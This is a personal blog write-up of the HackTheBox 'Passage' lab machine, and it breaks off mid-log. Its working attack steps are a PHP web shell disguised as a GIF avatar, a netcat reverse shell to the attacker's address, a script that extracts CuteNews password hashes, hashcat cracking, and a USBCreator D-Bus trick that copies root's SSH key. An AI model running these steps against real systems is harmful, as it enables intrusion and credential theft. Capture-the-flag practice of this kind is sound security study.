---
layout: post
title: HackTheBox Write-up &mdash; Passage
---

*WARNING: This is my first "hack"; as such, I change tack a couple of times, and it is messy...*

This machine is currently active, and is my first attempt at HTB.  Its IP address is `10.10.10.206`.

# The Short Version
<ol>
<li>Run <code class="highlighter-rouge">nmap -sC -sV 10.10.10.206</code> to get the open ports;</li>
<li> Run <code class="highlighter-rouge">echo "10.10.10.206    passage" | sudo tee -a /etc/hosts</code> to get a nicer way to reference the machine;</li>
<li>Go to <code class="highlighter-rouge">http://passage:80</code> on your browser.  Notice it uses CuteNews;</li>
<li>Go to <code class="highlighter-rouge">http://passage:80/CuteNews/</code> and create an account;</li>
<li>Edit your account by uploading an avatar "photo", which is really just a file containing:
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GIF8;
<span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])</span> <span class="cp">?&gt;</span>
</code></pre></div></div>
</li>
<li>Go to <code class="highlighter-rouge">http://passage:80/CuteNews/uploads/</code>, and click on your recently uploaded PHP file;</li>
<li>Run <code class="highlighter-rouge">nc -nlvp 1234</code> in a terminal window;</li>
<li>Get the IP address of your <code class="highlighter-rouge">tun0</code> interface: <code class="highlighter-rouge">ifconfig | grep -A 1 'tun0' | tail -1 | grep -o -P 'inet(.{0,15})' | grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])'</code>;</li>
<li>Append the URL of your upload with <code class="highlighter-rouge">?cmd=nc -e /bin/bash <IP from step 8> 1234</code>;</li>
<li>Go back to your terminal and run <code class="highlighter-rouge">python3 -c 'import pty; pty.spawn("/bin/bash")'</code> to gain access to a shell;</li>
<li>Now that you have access, you need some passwords.  There are some hashed passwords, encoded using <code class="highlighter-rouge">base64</code>, in the <code class="highlighter-rouge">/var/www/html/CuteNews/cdata/users/</code> directory.  You will need to get each of their hashes where possible: you can do some *quick and dirty* bash parsing to get the usernames and hashes:
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>i <span class="k">in</span> /var/www/html/CuteNews/cdata/users/<span class="k">*</span>.php<span class="p">;</span> <span class="k">do </span><span class="nv">DECODED</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">tail</span> <span class="nt">-n</span> 1 <span class="s2">"</span><span class="nv">$i</span><span class="s2">"</span> | <span class="nb">base64</span> <span class="nt">-d</span> 2&gt;/dev/null<span class="si">)</span><span class="s2">"</span><span class="p">;</span> <span class="nv">RET_VAL</span><span class="o">=</span><span class="nv">$?</span><span class="p">;</span> <span class="k">if</span> <span class="o">[</span> <span class="nv">$RET_VAL</span> <span class="nt">-eq</span> 0 <span class="o">]</span><span class="p">;</span> <span class="k">then </span><span class="nv">HASH</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$DECODED</span><span class="s2">"</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="s1">'64:'</span> <span class="s1">'{print $2}'</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="s1">';'</span> <span class="s1">'{print $1}'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'"'</span> | <span class="nb">sed</span> <span class="s1">'/^$/d'</span><span class="si">)</span><span class="s2">"</span><span class="p">;</span> <span class="k">if</span> <span class="o">[[</span> <span class="o">!</span> <span class="nt">-z</span> <span class="s2">"</span><span class="k">${</span><span class="nv">HASH</span><span class="k">}</span><span class="s2">"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then </span><span class="nv">NAME</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$DECODED</span><span class="s2">"</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="s1">'"email"'</span> <span class="s1">'{print $2}'</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="s1">'@'</span> <span class="s1">'{print $1}'</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="s1">'"'</span> <span class="s1">'{print $2}'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'"'</span> | <span class="nb">sed</span> <span class="s1">'/^$/d'</span><span class="si">)</span><span class="s2">"</span><span class="p">;</span> <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="k">${</span><span class="nv">NAME</span><span class="k">}</span><span class="se">\n</span><span class="k">${</span><span class="nv">HASH</span><span class="k">}</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="k">fi</span><span class="p">;</span> <span class="k">fi</span><span class="p">;</span> <span class="k">done</span>
</code></pre></div></div>
You could also parse the <code class="highlighter-rouge">/var/www/html/CuteNews/cdata/users/lines</code> file using <code class="highlighter-rouge">while read</code>, as I think that has the same content;</li>
<li>You will now need to choose a hash and decode it.  For me, <code class="highlighter-rouge">paul</code>'s hash worked.  I checked <code class="highlighter-rouge">hash-identify</code> to see that it was likely <code class="highlighter-rouge">SHA-256</code>, and thus ran <code class="highlighter-rouge">sudo gzip -d /usr/share/wordlists/rockyou.txt.gz && hashcat -a 0 -m 1400 "$OUR_HASH" /usr/share/wordlists/rockyou.txt && hashcat --show -m 1400 "$OUR_HASH"</code>: we see the password is <code class="highlighter-rouge">atlanta1</code>.  (Thank you, Paul, for having a terrible password);</li>
<li>Login as Paul; <code class="highlighter-rouge">su paul</code>&mdash;using the password we found above.  Capture an intermediate flag: <code class="highlighter-rouge">cat ~/user.txt</code>;</li>
<li>As Paul seems to have access to admin's (<code class="highlighter-rouge">nadav</code>'s) account via <code class="highlighter-rouge">ssh</code>, we can run <code class="highlighter-rouge">ssh -i ~/.ssh/id_rsa nadav@passage</code>; now we are pretending to be <code class="highlighter-rouge">nadav</code>;</li>
<li>Now we are admin, making use of a vulnerability in the USBCreator D-Bus interface that allows privilege escalation, we can gain root access to this machine by running <code class="highlighter-rouge">cd /tmp && gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/pwn true && ssh -i pwn root@passage</code>;</li>
<li>Capture the "flag": <code class="highlighter-rouge">cat /root/root.txt</code>.</li>
</ol>

# The Long (Verbatim) Version

After pinging it, I have run
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV 10.10.10.206
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-23 18:37 EST
Nmap scan report for 10.10.10.206
Host is up (0.70s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Passage News
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.67 seconds
```

From this, we see that port `80` is open in http.  I edited `/etc/hosts` so that it now looks like this:
```bash
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.10.206    passage

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

You can see where I have added `passage`; the machine we are trying to hack.

Now going into the web browser and typing `http://passage:80`, we get a website!  Horay!

This page is a news page.  The only news article here that is not in Latin is named
```
**Implemented Fail2Ban**
```

I click on this and this is the body:

```
Due to unusally large amounts of traffic, we have implementated Fail2Ban on our website. Let it be known that excessive access to our server will be met with a two minute ban on your IP Address. While we do not wish to lock out our legitimate users, this decision is necessary in order to ensure a safe viewing experience. Please proceed with caution as you browse through our extensive news selection. View & Comment
```

There is a comments box.  My very first thought was SQL Injections, but then I was reminded of PHP, so I tried commenting something using PHP.  Nothing happened (though the comment did go through).  Then I tried JavaScript, as one of the comments wrote
```html
<script>alert(5)</script>
```

However, after attempting to write
```html
<script>console.log("Test")</script>
```
The page broke, and I had to go back to the main page, at which point both comments previously there were gone.  I cannot recall what the first comment had said.  I have no idea why

I also noted that the admin who posted this has the link to an email address: `nadav@passave.htb`.  This might, I think, come in handy with the other open port: `ssh`.

I came to a realisation: why can't I simply google what I want.  I searched `comments section exploit` but didn't find much.  However, after literally searching `cutenews exploit` and finding [this](https://www.exploit-db.com/exploits/10002), I tried the following:
```
[link=javascript://%0adocument.write('<script>alert(/xss/)</script>')]funny pictures[/link]
```

Note: you can allow embedded browsers to run without sandbox for BurpSuite by doing [Project options > Misc > Embedded Browser > Allow the embedded browser to run without a sandbox](https://hooya0011.tistory.com/84).  I was going to use BurpSuite for this task, but I found other avenues, though this will likely come up in the future.

After trying a lot of those exploits, I appended my search with `git`, and found [this repo](https://github.com/CRFSlick/CVE-2019-11447-POC), which I cloned.  I then made a CuteNews account for Passage by putting `/CuteNews/` before `index.php`, and logged into CuteNews using this python script, and uploaded the evil image (`sad.gif`).  This gave me a reverse shell, but it wasn't quite what I wanted; every command I ran gave me a bunch of HTML.  I needed to find a similar exploit, but this one wasn't working.

I went back to my Google search and found [this](https://github.com/mt-code/CVE-2019-11447).  I ran this, which uploads a php shell file as my avatar.  After that was successful, I must admit I was a little lost: how do I now use this exploit?  I went back to my refined search once again and found [this](https://raw.githubusercontent.com/musyoka101/CuteNews_2.1.2_RCE_exploit/master/exploit.py) exploit script, which I then ran and put the URL in, as well as my user credentials, and voila&mdash;: a reverse shell!

```
┌──(kali㉿kali)-[~/testing]
└─$ python3 exploit.py                                                                                                                                                                             1 ⨯ 2 ⚙



           _____     __      _  __                     ___   ___  ___
          / ___/_ __/ /____ / |/ /__ _    _____       |_  | <  / |_  |
         / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/
         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/
                                ___  _________                        
                               / _ \/ ___/ __/                        
                              / , _/ /__/ _/                          
                             /_/|_|\___/___/                          
                                                                      

                                                                                                                                                   

Enter the URL> http://passage:80
================================================================
Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
================================================================
7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
================================================================

================================================================

================================================================
Possible users
================================================================
kim@example.com
paul@passage.htb
sid@example.com
nadav@passage.htb
================================================================

Do You Have a valid credential: [yes] or [no] ==> yes

[*] Please enter the credentials below
    Username ==> Christopher Tatlock
    Password ==> W@ci5M%QS^Kr8x3ov7!7
[+] Login was successfull

================================================================
Sending Payload
================================================================
signature_key: fad251d607c5ac7ebd52ada5f4c48144-Christopher Tatlock
signature_dsi: 7d4328bd3891236ddce1cb524aeda03b
logged in user: Christopher Tatlock

============================
Dropping to a SHELL
============================

command >
```

This exploit uploads PHP code as your profile picture.

I ran `ls /home/` and saw the users `nadav` (that admin we noted earlier) and `paul`; neat!  I recall that there is an `ssh` port open, so I try to make a user for myself (I have done this before; it is trivial for Linux users).  The only tricky thing is that this shell is very minimal and only has `stdout`, I believe.  To get around this, I might show everything as stdout by
```bash
<cmd> 2>&1
```

```bash
command > cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
nadav:x:1000:1000:Nadav,,,:/home/nadav:/bin/bash
paul:x:1001:1001:Paul Coles,,,:/home/paul:/bin/bash
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
```

We see `paul` and `nadav` down there, as users already, but we do not have access to the password.  We try to add our own user:
```bash
command > sudo useradd christopher 2>&1
sudo: no tty present and no askpass program specified
```
But it does not register our terminal very well (as the shell is minimal/bad).  We change tack: doing some more research I find a command line tool that makes exploiting in general easier.

---

We can check `exploit-db` again this time using `searchsploit`; a command line tool linked to that, and which makes *implementing* these exploitx easie.  Here is the output:
```
---------- ---------------------------------
CuteNews - 'page' Local File Inclusion                                                                                                                                   | php/webapps/15208.txt
CuteNews 0.88 - 'comments.php' Remote File Inclusion                                                                                                                     | php/webapps/22285.txt
CuteNews 0.88 - 'search.php' Remote File Inclusion                                                                                                                       | php/webapps/22284.txt
CuteNews 0.88 - 'shownews.php' Remote File Inclusion                                                                                                                     | php/webapps/22283.txt
CuteNews 0.88/1.3 - 'example1.php' Cross-Site Scripting                                                                                                                  | php/webapps/24238.txt
CuteNews 0.88/1.3 - 'example2.php' Cross-Site Scripting                                                                                                                  | php/webapps/24239.txt
CuteNews 0.88/1.3 - 'show_archives.php' Cross-Site Scripting                                                                                                             | php/webapps/24240.txt
CuteNews 0.88/1.3.x - 'index.php' Cross-Site Scripting                                                                                                                   | php/webapps/24566.txt
CuteNews 1.1.1 - 'html.php' Remote Code Execution                                                                                                                        | php/webapps/4851.txt
CuteNews 1.3 - Comment HTML Injection                                                                                                                                    | php/webapps/24290.txt
CuteNews 1.3 - Debug Query Information Disclosure                                                                                                                        | php/webapps/23406.txt
CuteNews 1.3.1 - 'show_archives.php' Cross-Site Scripting                                                                                                                | php/webapps/24372.txt
CuteNews 1.3.6 - 'result' Cross-Site Scripting                                                                                                                           | php/webapps/29217.txt
CuteNews 1.4.0 - Shell Injection / Remote Command Execution                                                                                                              | php/webapps/1221.php
CuteNews 1.4.1 - 'categories.mdu' Remote Command Execution                                                                                                               | php/webapps/1400.pl
CuteNews 1.4.1 - 'function.php' Local File Inclusion                                                                                                                     | php/webapps/1612.php
CuteNews 1.4.1 - 'search.php' Multiple Cross-Site Scripting Vulnerabilities                                                                                              | php/webapps/27819.txt
CuteNews 1.4.1 - 'show_archives.php' Traversal Arbitrary File Access                                                                                                     | php/webapps/26465.txt
CuteNews 1.4.1 - 'show_news.php' Cross-Site Scripting                                                                                                                    | php/webapps/27252.txt
CuteNews 1.4.1 - 'template' Traversal Arbitrary File Access                                                                                                              | php/webapps/26466.txt
CuteNews 1.4.1 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                           | php/webapps/27740.txt
CuteNews 1.4.1 - Shell Injection / Remote Command Execution                                                                                                              | php/webapps/1289.php
CuteNews 1.4.5 - 'rss_title' Cross-Site Scripting                                                                                                                        | php/webapps/29159.txt
CuteNews 1.4.5 - 'show_news.php' Cross-Site Scripting                                                                                                                    | php/webapps/29158.txt
CuteNews 1.4.5 - Admin Password md5 Hash Fetching                                                                                                                        | php/webapps/4779.php
CuteNews 1.4.6 - 'from_date_day' Full Path Disclosure                                                                                                                    | php/webapps/33341.txt
CuteNews 1.4.6 - 'index.php' Cross-Site Request Forgery (New User Creation)                                                                                              | php/webapps/33344.txt
CuteNews 1.4.6 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities                                                                                               | php/webapps/33340.txt
CuteNews 1.4.6 - 'ip ban' Authorized Cross-Site Scripting / Command Execution                                                                                            | php/webapps/7700.php
CuteNews 1.4.6 - 'result' Cross-Site Scripting                                                                                                                           | php/webapps/33343.txt
CuteNews 1.4.6 - 'search.php' Multiple Cross-Site Scripting Vulnerabilities                                                                                              | php/webapps/33342.txt
CuteNews 1.4.6 editnews Module - doeditnews Action Admin Moderation Bypass                                                                                               | php/webapps/33345.txt
CuteNews 2.0.3 - Arbitrary File Upload                                                                                                                                   | php/webapps/37474.txt
CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)                                                                                                             | php/remote/46698.rb
CuteNews 2.1.2 - Arbitrary File Deletion                                                                                                                                 | php/webapps/48447.txt
CuteNews 2.1.2 - Authenticated Arbitrary File Upload                                                                                                                     | php/webapps/48458.txt
CuteNews 2.1.2 - Remote Code Execution                                                                                                                                   | php/webapps/48800.py
CuteNews aj-fork - 'path' Remote File Inclusion                                                                                                                          | php/webapps/32570.txt
CuteNews aj-fork 167f - 'cutepath' Remote File Inclusion                                                                                                                 | php/webapps/2891.txt
CuteNews and UTF-8 CuteNews - Multiple Vulnerabilities                                                                                                                   | php/webapps/10002.txt
CutePHP CuteNews 1.3 - HTML Injection                                                                                                                                    | php/webapps/22842.txt
CutePHP CuteNews 1.3.6 - 'x-forwarded-for' Script Injection                                                                                                              | php/webapps/25177.txt
CutePHP CuteNews 1.4.1 - 'index.php' Cross-Site Scripting                                                                                                                | php/webapps/27356.txt
CutePHP CuteNews 1.4.1 Editnews Module - Cross-Site Scripting                                                                                                            | php/webapps/27676.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results~
```

We see that there is an avatar remote code execution (RCE), which is always a good bet, so we download the application used to run this exploit:
```bash
┌──(kali㉿kali)-[~]
└─$ searchsploit -m 46698.rb                                                                                                                                                                           2 ⚙
  Exploit: CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)
      URL: https://www.exploit-db.com/exploits/46698
     Path: /usr/share/exploitdb/exploits/php/remote/46698.rb
File Type: Ruby script, UTF-8 Unicode text, with CRLF line terminators

Copied to: /home/kali/46698.rb
```

Now we can use metasploit (`msfconsole`) to run this:
```
$ msfconsole

                                                                                                                           
." @@@@@'.,'@@            @@@@@',.'@@@@ ".                                                                                                                                                                 
'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;                                                                                                                                                                 
   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'                                                                                                                                                                 
     "--'.@@@  -.@        @ ,'-   .'--"                                                                                                                                                                    
          ".@' ; @       @ `.  ;'                                                                                                                                                                          
            |@@@@ @@@     @    .                                                                                                                                                                           
             ' @@@ @@   @@    ,                                                                                                                                                                            
              `.@@@@    @@   .                                                                                                                                                                             
                ',@@     @   ;           _____________                                                                                                                                                     
                 (   3 C    )     /|___ / Metasploit! \                                                                                                                                                    
                 ;@'. __*__,."    \|--- \_____________/                                                                                                                                                    
                  '(.,...."/                                                                                                                                                                               


       =[ metasploit v6.0.15-dev                          ]
+ -- --=[ 2071 exploits - 1123 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: View advanced module options with advanced

msf6 >
```

There are some errors loading this module, which we check by checking the error log:
```
msf6 > cat ~/.msf4/logs/framework.log
[*] exec: cat ~/.msf4/logs/framework.log

[02/28/2021 18:38:19] [e(0)] core: Failed to connect to the database: No database YAML file
[02/28/2021 18:38:20] [d(0)] core: Created user based module store
[02/28/2021 18:38:27] [e(0)] core: Dependency for windows/x64/encrypted_shell_reverse_tcp is not supported
[02/28/2021 18:38:27] [e(0)] core: Dependency for windows/encrypted_shell_reverse_tcp is not supported
[02/28/2021 18:38:27] [e(0)] core: Dependency for windows/encrypted_reverse_tcp is not supported
[02/28/2021 18:38:27] [e(0)] core: Dependency for windows/x64/encrypted_reverse_tcp is not supported
```

Okay, so we need to edit the module (`46698.rb`) that we got from `exploit-db`, so that it doesn't have any errors.  Touching up on our Ruby knowledge (which I've used a bit in the past, just for a simple PDF searcher), we need to edit the module in `def initializer` to stop these errors.  It is under this module that the errors are being thrown.

All we needed to do was remove the `References` section to make it work.  

We also need to change the login details:
```ruby
register_options(
      [
        OptString.new('TARGETURI', [true, "http://passage:80", '/CuteNews']),
        OptString.new('USERNAME', [true, "Christopher Tatlock", 'admin']),
        OptString.new('PASSWORD', [false, "W@ci5M%QS^Kr8x3ov7!7", 'admin'])
      ]
    )
```

Now restarting the Metasploit Framework Console, we see that is shows a different message:
```
$        

                                                                                                                   
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'                                                                                                                                                                
  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo                                                                                                                                                                
  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx                                                                                                                                                                
  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl                                                                                                                                                                
  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.                                                                                                                                                                
   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc                                                                                                                                                                 
    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo                                                                                                                                                                  
     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl                                                                                                                                                                   
      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;                                                                                                                                                                    
       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.                                                                                                                                                                     
         ,kOl'M.OOOOOOOOOOOOO.M'dOk,                                                                                                                                                                       
           :kk;.OOOOOOOOOOOOO.;Ok:                                                                                                                                                                         
             ;kOOOOOOOOOOOOOOOk:                                                                                                                                                                           
               ,xOOOOOOOOOOOx,                                                                                                                                                                             
                 .lOOOOOOOl.                                                                                                                                                                               
                    ,dOd,                                                                                                                                                                                  
                      .                                                                                                                                                                                    

       =[ metasploit v6.0.15-dev                          ]
+ -- --=[ 2071 exploits - 1123 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: You can use help to view all available commands

msf6 >
```

Now, I don't know much about web shells, but within this shell I can `ping` `passage`, which tells me it has access to my `hosts` file.  So I guess we need to get to the web shell we had previously (though, hoping this shell will give us access to a much better web shell).  To gain access to the machine again, after a little bit of research, I try


Still not working, so I decided to put everything into a dedicated directory: `~/.msf6/exploit/cgi/webapps/46698.rb`.  Still not working, when I run `search 46698` inside the `msf6` shell.  `msf6` seems to be relatively new, and has slightly different functionality to `msf5`, so I might need to do some more research into this later.

---

I am going to try using that other PHP shell again.  It looks like my user was deleted previously, so I just add another user of the same credentials, and run `exploit.py` in the `testing` directory again.  

Once in again, we notice that there is a directory in `/var` corresponding to the users of the `CuteNews` app: `/var/www/html/CuteNews/cdata/users/`.

We run `ls` on this directory:
```
command > ls /var/www/html/CuteNews/cdata/users
09.php
0a.php
0b.php
16.php
21.php
22.php
23.php
2b.php
31.php
32.php
39.php
47.php
52.php
59.php
5d.php
5e.php
65.php
66.php
6a.php
6c.php
6e.php
75.php
76.php
77.php
7a.php
8b.php
8f.php
95.php
97.php
99.php
a0.php
a2.php
a4.php
aa.php
b0.php
c1.php
c8.php
d4.php
d5.php
d6.php
e5.php
f7.php
fc.php
lines
users.txt
```

The `users.txt` seems empty, but we can check what's inside the `php` files:
```
command > cat /var/www/html/CuteNews/cdata/users/0b.php
<?php die('Direct call - access denied'); ?>
YToyOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoieTl3cW12djA0eiI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNjE0NTUxMjUzIjtzOjQ6Im5hbWUiO3M6MTA6Ink5d3FtdnYwNHoiO3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MTg6Ink5d3FtdnYwNHpAaGFjay5tZSI7czo0OiJuaWNrIjtzOjEwOiJ5OXdxbXZ2MDR6IjtzOjQ6InBhc3MiO3M6NjQ6IjJlMjM5YTAxNDk1MzhkZThhZjk1Mjk2MmFjODFiMjg5NDFkOWY1YTIyZWZkMmI3YWRiOTQ3NWFiODkzNDM2N2IiO3M6NDoibW9yZSI7czo2MDoiWVRveU9udHpPalE2SW5OcGRHVWlPM002TURvaUlqdHpPalU2SW1GaWIzVjBJanR6T2pBNklpSTdmUT09IjtzOjY6ImF2YXRhciI7czozMjoiYXZhdGFyX3k5d3FtdnYwNHpfeTl3cW12djA0ei5waHAiO3M6NjoiZS1oaWRlIjtzOjA6IiI7fX1zOjI6ImlkIjthOjE6e2k6MTYxNDU1MTkwNTtzOjEwOiJGQnd6YkhtejVXIjt9fQ==
```

Well that looks distinctly like `bashe64`!  And indeed, it is (though still obfuscated):
```
┌──(kali㉿kali)-[~]
└─$ echo "YToyOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoieTl3cW12djA0eiI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNjE0NTUxMjUzIjtzOjQ6Im5hbWUiO3M6MTA6Ink5d3FtdnYwNHoiO3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MTg6Ink5d3FtdnYwNHpAaGFjay5tZSI7czo0OiJuaWNrIjtzOjEwOiJ5OXdxbXZ2MDR6IjtzOjQ6InBhc3MiO3M6NjQ6IjJlMjM5YTAxNDk1MzhkZThhZjk1Mjk2MmFjODFiMjg5NDFkOWY1YTIyZWZkMmI3YWRiOTQ3NWFiODkzNDM2N2IiO3M6NDoibW9yZSI7czo2MDoiWVRveU9udHpPalE2SW5OcGRHVWlPM002TURvaUlqdHpPalU2SW1GaWIzVjBJanR6T2pBNklpSTdmUT09IjtzOjY6ImF2YXRhciI7czozMjoiYXZhdGFyX3k5d3FtdnYwNHpfeTl3cW12djA0ei5waHAiO3M6NjoiZS1oaWRlIjtzOjA6IiI7fX1zOjI6ImlkIjthOjE6e2k6MTYxNDU1MTkwNTtzOjEwOiJGQnd6YkhtejVXIjt9fQ=="  | base64 -d
a:2:{s:4:"name";a:1:{s:10:"y9wqmvv04z";a:9:{s:2:"id";s:10:"1614551253";s:4:"name";s:10:"y9wqmvv04z";s:3:"acl";s:1:"4";s:5:"email";s:18:"y9wqmvv04z@hack.me";s:4:"nick";s:10:"y9wqmvv04z";s:4:"pass";s:64:"2e239a0149538de8af952962ac81b28941d9f5a22efd2b7adb9475ab8934367b";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:6:"avatar";s:32:"avatar_y9wqmvv04z_y9wqmvv04z.php";s:6:"e-hide";s:0:"";}}s:2:"id";a:1:{i:1614551905;s:10:"FBwzbHmz5W";}}
```

I think the thing of interest is after the `pass` field:
```
"2e239a0149538de8af952962ac81b28941d9f5a22efd2b7adb9475ab8934367b"
```

This looks like a hashed password, if ever I saw one!  But which hash?  Well, hopefully nothing too secure, as it is ultimately a machine that is made to be hacked.  Let's try an old one first: `SHA`.  We can try this [online](https://md5decrypt.net/en/Sha256/), but unfortunately `SHA-256` does not have a hash in the database.  We can try a different decryption method!  How about `md5`?  No luck with that.

Okay, I have tried a bunch of those different files now, but nothing was coming up.  Until I trie Paul's file:
```bash
